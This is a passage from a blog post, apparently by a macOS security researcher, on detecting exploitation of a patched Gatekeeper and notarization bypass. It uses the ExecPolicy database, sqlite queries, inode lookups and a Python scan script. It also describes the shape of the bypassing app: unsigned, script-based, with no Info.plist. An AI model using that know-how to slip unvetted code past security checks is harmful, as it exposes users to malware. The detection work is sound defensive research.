<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">

# sqlite3 ExecPolicy

sqlite> .headers on

sqlite> SELECT * FROM policy_scan_cache WHERE object_id = 121493800;

pk|volume_uuid|object_id|fs_type_name|bundle_id|cdhash|team_identifier|signing_identifier|policy_match|malware_result|flags|mod_time|timestamp|revocation_check_time|scan_version

15949|0612A910-2C3C-4B72-9C90-1ED71F3070C3|121493800|apfs|NOT_A_BUNDLE||||7|0|512|1618194723|1618194723|1618194723|4146150715079370460

</pre>
</div>
<p>Perfect, this confirms that the systems evaluation results of our PoC application was in fact logged to the <code>ExecPolicy</code> database.</p>
<p>Let&rsquo;s now select all items that have similar values to what we saw in the logs, such as flags of <code>512</code> (we&rsquo;ll also add a few other constraints such as <code>NOT_A_BUNDLE</code>):</p>
<pre tabindex="0"><code>SELECT * FROM policy_scan_cache WHERE flags = 512 AND bundle_id = &#39;NOT_A_BUNDLE&#39; AND policy_match = 7; Result: 183 rows returned in 100ms 
</code></pre><p>&hellip;still a lot. But many are simply legitimate utilities that you&rsquo;ve downloaded and approved on your system (and thus can be ignored). For example, on my box there is a row containing the <code>object_id</code> (inode) value of <code>23503887</code>. This maps to <code>supraudit</code>, an unsigned audit utility (created by J. Levin) that I had previously downloaded and manually approved/ran:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ stat /usr/local/bin/supraudit
16777220 23503887 /usr/local/bin/supraudit
</pre>
</div>
<p>Armed with this knowledge we can perhaps uncover successful exploitations of this bug in the following manner:</p>
<ol>
<li>
<p>Enumerate the rows in the <code>policy_scan_cache</code> table, filtering on ones that (the policy engine thought were) not a bundle, have flag value of 0x200 (512).</p>
</li>
<li>
<p>For each result, take its <code>volume_uuid</code> and <code>object_id</code> value. The latter is really the item&rsquo;s (evaluee&rsquo;s) inode number.</p>
</li>
<li>
<p>Find the item on the matching volume, via this inode value. How? Well after reading Howard Oakley&rsquo;s  &ldquo;<a href="https://eclecticlight.co/2018/03/05/open-recent-inodes-and-bookmarks-how-macos-remembers-files/">Open Recent, inodes, and Bookmarks: How macOS remembers files</a>&rdquo; I learned the <code>GetFileInfo</code> utility (found in <code>/usr/bin/</code>) can, given a volume and file <code>inode</code>, return the file&rsquo;s path:
<br>
<br>
<code>GetFileInfo /.vol/&lt;volume inode&gt;/&lt;file inode&gt;</code></p>
</li>
<li>
<p>In the <code>policy_scan_cache</code> table we noted there are many legitimate applications and utilities (that you&rsquo;ve download and approved to run on your system). As such, we need to parse through each item (that we&rsquo;ve found via its inode), to check if it&rsquo;s a suspicious bare-bones script-based application. Specifically we can look for a items with:
<br>
<br>
a. An <code>*.app</code> in its path.
<br>
<br>
b. A <code>/Contents/MacOS/</code> subdirectory.
<br>
<br>
c. An item (within the <code>Contents/MacOS/</code> subdirectory) that matches the app&rsquo;s name <em>and</em> is a script.
<br>
<br>
d. Does not contain an <code>Info.plist</code> file.</p>
</li>
</ol>
<p>Find such an item, you&rsquo;ve more than likely got a malicious item &hellip;or at least one that you should take a very close look at! üëÄ</p>
<p>Let&rsquo;s look at an example, using the malware that was exploiting this vulnerability as an 0day.</p>
<p>After running the malware, we notice a new entry in the <code>/private/var/db/SystemPolicyConfiguration/ExecPolicy</code> database:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
# sqlite3 /private/var/db/SystemPolicyConfiguration/ExecPolicy
sqlite> SELECT * FROM policy_scan_cache WHERE flags = 512 AND bundle_id = 'NOT_A_BUNDLE' AND pk=(SELECT max(pk) FROM policy_scan_cache);

pk|volume_uuid|object_id|fs_type_name|bundle_id|cdhash|team_identifier|signing_identifier|policy_match|malware_result|flags|mod_time|timestamp|revocation_check_time|scan_version

77|0A81F3B1-51D9-3335-B3E3-169C3640360D|12885173338|apfs|NOT_A_BUNDLE||||7|0|512|1618359929|1618359929|1618359929|4146150715079370460
</pre>
</div>
<p>We then extract the value of the <code>object_id</code>, <code>12885173338</code>, (which recall is the file&rsquo;s <code>inode</code>), and use that to locate the file on disk.</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
# get volume's inode
% stat /
16777220 2 drwxr-xr-x 20 root wheel ...

# get file's (inode: 12885173338) path
% GetFileInfo /.vol/16777220/12885173338
file: "/Users/user/Downloads/yWnBJLaF/1302.app"
...

# its not signed
% codesign -dvvv 1302.app
1302.app: code object is not signed at all

# is a bare-boned application bundle
% find  /Users/user/Downloads/yWnBJLaF/1302.app
1302.app/Contents
1302.app/Contents/MacOS
1302.app/Contents/MacOS/1302

# who's executable component, is a script
% file 1302.app/Contents/MacOS/1302
1302.app/Contents/MacOS/1302: Bourne-Again shell script executable (binary data)
</pre>
</div>
<p>Note that once the file has been located, (in the terminal output above) we confirm it&rsquo;s an unsigned, bare-boned (no <code>Info.plist</code>) script-based application! Clearly fits the profile of an item exploiting this bug.</p>
<p>To automate the detection of such (potentially) malicious applications (on the main volume) I&rsquo;ve created a simple Python script: <a href="https://objective-see.com/downloads/blog/blog_0x64/scan.py"><code>scan.py</code></a>. This script programmatically queries the <code>ExecPolicy</code> database, then processes the results in order to locate any script-based applications (without an <code>Info.plist</code> file) that have been run</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#f92672">...</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>query <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;SELECT * FROM policy_scan_cache WHERE volume_uuid = &#39;&#34;</span> <span style="color:#f92672">+</span> volUUID <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39; AND flags = 512 AND bundle_id = &#39;NOT_A_BUNDLE&#39;&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>connection <span style="color:#f92672">=</span> sqlite3<span style="color:#f92672">.</span>connect(<span style="color:#e6db74">&#34;/private/var/db/SystemPolicyConfiguration/ExecPolicy&#34;</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>items <span style="color:#f92672">=</span> execute_read_query(connection, query)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span><span style="color:#75715e">#scan/parse all items</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span><span style="color:#75715e"># looking for file on main volume that</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span><span style="color:#75715e"># a) is an app bundle</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span><span style="color:#75715e"># b) is a script-based app bundle</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span><span style="color:#75715e"># c) is a script-based app bundle, without an Info.plist file</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span><span style="color:#66d9ef">for</span> item <span style="color:#f92672">in</span> items:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>   
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>  <span style="color:#75715e">#get file path from vol &amp; file inode</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>  fileURL <span style="color:#f92672">=</span> Foundation<span style="color:#f92672">.</span>NSURL<span style="color:#f92672">.</span>fileURLWithPath_(<span style="color:#e6db74">&#39;/.vol/&#39;</span> <span style="color:#f92672">+</span> str(volInode) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/&#39;</span> <span style="color:#f92672">+</span> str(item[<span style="color:#ae81ff">2</span>]))
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span>  result, file, error <span style="color:#f92672">=</span> fileURL<span style="color:#f92672">.</span>getResourceValue_forKey_error_(<span style="color:#66d9ef">None</span>, <span style="color:#e6db74">&#34;NSURLCanonicalPathKey&#34;</span>, <span style="color:#66d9ef">None</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span><span>  <span style="color:#f92672">...</span></span></span></code></pre></div>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
# python scan.py 
volume inode: 16777220
volume uuid:  0A81F3B1-51D9-3335-B3E3-169C3640360D

opened 'ExecPolicy' database
extracted 183 evaluated items

possible malicious application: /Users/user/Downloads/yWnBJLaF/1302.app

detected 1 possible malicious applications
</pre>
</div>
<br>
<div class="note">
If the item (malware) is run off a disk image, the system will copy it off the .dmg to translocate the item before its evaluated. The entry in the database will therefore reference the translocated item. Unfortunately translocated items are automatically deleted by the system. 
<p>As such, the object_id (inode) may reference a file that no longer exists :/</p>
</div>
<h3 id="conclusions">Conclusions</h3>
<p>The vast, vast, majority of macOS malware requires some user interaction (such as directly running the actual malicious code) in order to infect a macOS system. Unfortunately such macOS malware still abounds and everyday countless Mac users are infected.</p>
<p>Since 2007, Apple has sought to protect users from inadvertently infecting themselves if they are tricked into running such malicious code. This is a good thing as sure, users may be naive, but anybody can make a mistakes. Moreover such protections (specifically notarization requirements) may now even protect users from advanced supply-chain attacks &hellip;and more!</p>
<p>Unfortunately due to subtle logic flaw in macOS, such security mechanisms were proven fully and 100% moot, and as such we&rsquo;re basically back to square one &hellip;(well, more precisely pre-2007). Yikes!</p>
<p>In this blog post, we started with an unsigned, unnotarized, script-based proof of concept application that could trivially and reliably sidestep all of macOS&rsquo;s relevant security mechanisms (File Quarantine, Gatekeeper, and Notarization Requirements) &hellip;even on a fully patched M1 macOS system. Armed with such a capability macOS malware authors could (and are) returning to their proven methods of targeting and infecting macOS users. Yikes again!</p>
<p>The core of the blog post dug deep into the policy internals of macOS, ultimately revealing a subtle logic flaw. A shown, this flaw can result in the misclassification of certain applications, and thus would cause the policy engine to skip essential security logic such as alerting the user and blocking the untrusted application.</p>
<p>After reversing Apple&rsquo;s update, we highlighted the patch, noting how the classification algorithm was improved. This will now result in the correct classification of applications (as bundles), and ensure that untrusted, unnotarized applications will (yet again) be blocked, and thus the user protected.</p>
<img src="../images/blog/blog_0x64/patched.png"  width="33%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">(correctly) blocked on macOS 11.3</center>

<p>Finally, we wrapped things up first with a brief discussion on protections, most notably highlighting the fact that <a href="https://www.objective-see.com/products/blockblock.html">BlockBlock</a> already provides sufficient protections &hellip;beating out Cupertino ;)</p>
<img src="../images/blog/blog_0x64/blocked.png"  width="75%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">BlockBlock, block blocking!</center>

<br>
<div class="note">
Interested in enterprise grade protection?
<p>As noted, <a href="https://www.jamf.com/?utm_source=objective-see&amp;utm_medium=sponsored-link&amp;utm_campaign=next-gen-security&amp;utm_content=2021-02-05_protect">Jamf Protect</a> already contains detection logic for such threats, and thus was able to uncover malware exploiting this flaw as a 0day!</p>
</div>
<p>Then, we discussed a novel idea aimed at detecting attacks that exploit this flaw, by examining evaluation results logged to the (undocumented) <code>ExecPolicy</code> database.</p>
<p>To end, a few thoughts&hellip;</p>
<p>Though this bug is now patched, it clearly (yet again) illustrates that macOS is not impervious to incredible shallow, yet hugely impactful flaws. How shallow? Well that fact that a legitimate developer tool (<a href="https://gist.github.com/mathiasbynens/674099">appify</a>) would inadvertently trigger the bug is beyond laughable (and sad).</p>
<p>And how impactful? Basically macOS security (in the context of evaluating user launched applications, which recall, accounts for the vast majority of macOS infections) was made wholly moot.</p>
<p>Good thing there are free open-source security tools that can offer an extra (better?) layer of protection!</p>
<p>And maybe one day Apple will stop suing <a href="https://www.vice.com/en/article/3azzpj/corellium-says-its-just-like-a-playstation-emulator-apple-lawsuit">security companies</a>, and instead focus solely on improving the security of their OS.
<br>
&hellip;hey, we can all dream, right?!</p>
<h3 id="-support-me">üíï Support Me:</h3>
<div style="border: 1px solid #DCDCDC; border-radius:7px; padding: 10px; margin-top:15px; margin-bottom: 15px;">
    <center>Love these blog posts? You can support them via my <a href="https://www.patreon.com/bePatron?c=701171" class="inlineLink">Patreon</a> page!
    <br><br>
    <a href="https://www.patreon.com/bePatron?c=701171" style="text-decoration: none;">
      <img src="../images/patreon.png" style="display:block;margin:auto; padding-top:0px; width:100%"/>
    </a>
    </center>
</div>
</section>

    </div>

    
<script src="/js/cookies.js"></script>
<script src="/social/ss-social.js"></script>
<link href="/social/ss-social.css" rel="stylesheet" />

<script> 
    $(function(){
        
        
        
        if("" == getCookie("acceptedCookies")) 
        {
            console.log('ok showing!')

            document.getElementById("cookies").style.display = "block";
        }

    });
</script>

<script>
function acceptCookies() {

    
    setCookie("acceptedCookies", "yes", 365);

    
    document.getElementById("cookies").style.display = "none";
}
</script>

<br>
<br>
<div id="cookies" class="cookie" style="padding-left:20px;">
    This website uses cookies to improve your experience.
    <div class="cookieButton">
        
        <button class="menuicon button-4" role="button" onclick="acceptCookies()" style="margin-top: 12px; float: right; padding:3px; padding-left: 10px; padding-right: 10px;">Okay!</button>
    </div>
</div>
<nav role="footer">
<ul>

    <li>
        <a href="mailto:contact@objective-see.com" class="menubutton icon"><span class="ss-icon" style="overflow-y: hidden;">&#x2709;</span></a>
    </li>

     <li>
        <a href="rss.xml" class="menubutton icon"><span class="ss-icon" style="overflow-y: hidden;">&#xE310;</span></a>
    </li>

    <li>
        <a href="https://www.youtube.com/channel/UCQycc8VDhHuNkZlKSSTDHzw" class="menubutton icon"><span class="ss-icon" style="overflow-y: hidden;">&#xF630;</span></a>
    </li>
   
    <li>
        <a href="https://twitter.com/objective_see" class="menubutton icon"><span class="ss-icon">&#xF611;</span></a>
    </li>
    
    <li>
         <form action="support.html" style="display: inline;">
            <button class="menuicon button-4" role="button" style="margin-top: 7px; float: right; padding:3px; padding-left: 10px; padding-right: 10px;">Support Us!</button>
        </form>
        
    </li>

    <li>
        <div style="margin-top: 10px;">
        Signup for our <a class="inlineLink" target="_blank" href="http://eepurl.com/bXpXeT">newsletter </a> ¬ª
        </div>
    </li>

</ul>
</nav>

  </body>
</html>